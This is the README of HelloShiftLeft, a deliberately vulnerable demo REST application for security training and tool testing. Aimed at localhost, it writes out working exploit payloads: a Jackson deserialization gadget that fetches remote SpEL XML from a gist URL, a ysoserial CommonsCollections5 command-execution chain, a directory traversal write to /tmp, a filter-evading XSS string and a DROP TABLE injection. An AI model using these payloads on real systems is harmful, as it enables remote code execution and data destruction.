# HelloShiftLeft

This is a demo application which provides a real world representation of a REST service that uses a mix of convention 
and configuration to simulate a decent set of vulnerabilities exposed in the code. It includes scenarios such as 
sensitive data leaking to logs, data secrets leaks, deserialization and XSS vulnerabilities  etc. The sample sensitive 
data is a mix of financial data such as account information, medical data of patients, and other PII data such as 
customer information. HelloShiftLeft also contains patterns/anti-patterns of how data is used/abused in interfaces or 
channels (to and from HTTP/TCP, third-party, database) that can lead to vulnerabilities. The application is built on the 
[Play Framework](https://www.playframework.com/) and exposes a series of endpoints and APIs for queries and simulating 
exploits. 

## Package

```
$ git clone https://github.com/ShiftLeftSecurity/HelloShiftLeft.git
$ cd HelloShiftLeft
$ sbt stage
```

This should generate the target target artifact `./target/helloshiftleftplay-0.0.0-SNAPSHOT.jar`

## Run

```
$ sbt run
$ curl -I http://localhost:8082
```

#### Standalone Package and Run

Standalone JAR can also be packaged and run as follows:

```
$ sbt assembly
$ java -Dplay.server.http.port="8082" -Dplay.server.http.address="127.0.0.1" -jar ./target/HelloshiftleftPlay-assembly-0.0.0-SNAPSHOT.jar
``` 

## HTTP Routes

See all available routes at [config/routes](config/routes). Use `localhost` as host name in the URLs


## Exercise Vulnerabilities and Exposures
HelloShiftLeft contains some common vulnerabilities that can be exercised and tested - some of 
which have been described below. 


### Jackson Deserialization

The route `/bean1599` accepts POST operations and deserializes via Jackson the received body data. The file 
`exploit.json` contains the payload for CVE-2017-17485. Instead, the file `exploitold.json` provides the payload for 
CVE-2017-7525.

**`exploit.json`**:

```json
{
   "name":"124",
   "id":[
      "org.springframework.context.support.FileSystemXmlApplicationContext",
      "https://gist.githubusercontent.com/vaiocosl/bcfda49d1035bea12381e9cac199b491/raw/1cac1fffa16a6125552ca686dca9cf49ad3b18c6/spel.xml"
   ]
}
```

To run the exploit, first run the server with `sbt run` then type following commands:

```
$ export payload=`cat exploit.json`
$ curl localhost:8082/bean1599 -X POST -H "Content-Type: application/json" -d "$payload"
``` 

#### Further Reading

* https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/
* https://github.com/irsl/jackson-rce-via-spel

### Java Deserialization 

Route `/unmarsh` retrieves the `lol` parameter from the received POST request, decode64 its values and finally calls 
`readObject`. To create the payload run `DoSerializeRCE` and then use its output to build the POST query as following:

```
$ curl localhost:8082/unmarsh  -X POST --data-urlencode "lol=rO0ABXNyABNEb1NlcmlhbGl6ZVJDRSRFdmlsx/E6K8+e2zIDAAB4cHg="
$ curl localhost:8082/unmarsh -X POST --data-urlencode "lol=`cat commons5.b64`"
$ java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 /usr/bin/xcalc > commons5.bin
base64 commons5.bin | tr -d '\040\011\012\015'> commons5.b64

```
### Directory Traversal

Route `/saveSettings` contains a arbitrary file write vulnerability. The file relative path is extracted from the 
attacker controllable cookies. To exploit the vuln use the `exploits/filewriteexploit.py` script, as shown below:

```
$ python filewriteexploit.py http://localhost:8082/saveSettings ../../../../../../../tmp/pwn asd
```
The above script will send the payload to the url specified as first argument, the relative path that will be used for 
the directory traversal is passed as second argument.

### XSS

A reflected XSS vulnerability exists in the application and can be triggered using the hidden /debug endpoint as follows:

http://localhost:8082/debug?customerId=1&clientId=1&firstName=a&lastName=b&dateOfBirth=1982-01-01&ssn=123&socialSecurityNum=1&tin=123&phoneNumber=5432%3Cscriscriptpt%3Ealert(1)%3C/sscriptcript%3E

It raises and alert dialogue and returns the Customer object data.

### SQLi
A simple malicious query can be passed to the `/rawcustomers` route as follows, though this vulnerability is not 
implemented in the code as of now:

```
http://localhost:8082/rawcustomers/1;%20DROP%20table%20customer
```

---

(C) 2018 ShiftLeft Inc.